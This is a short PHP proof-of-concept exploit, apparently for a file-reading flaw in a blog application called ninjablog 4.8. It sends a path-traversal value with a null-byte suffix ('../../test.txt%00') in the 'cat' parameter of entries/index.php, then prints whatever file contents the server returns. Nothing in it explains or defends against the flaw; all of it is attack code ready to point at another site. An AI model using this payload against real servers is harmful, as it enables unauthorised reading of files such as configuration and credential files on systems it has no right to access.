<?php

$strToRead = "../../test.txt%00"; //Designates 'test.txt', sat one level above the application folder, to be read
$strSite = "http://www.example.com/ninjablog4.8/"; //Don't forget the trailing slash

$objCurl = curl_init();
curl_setopt($objCurl, CURLOPT_URL, $strSite."entries/index.php?cat=".$strToRead);
curl_setopt($objCurl, CURLOPT_RETURNTRANSFER, true);

echo("Getting data...\n");
$strDump = curl_exec($objCurl);

curl_close($objCurl);

echo("<div style=\"border: solid 2px black; padding: 10px; margin: 10px;\">$strDump</div>\n");

?>

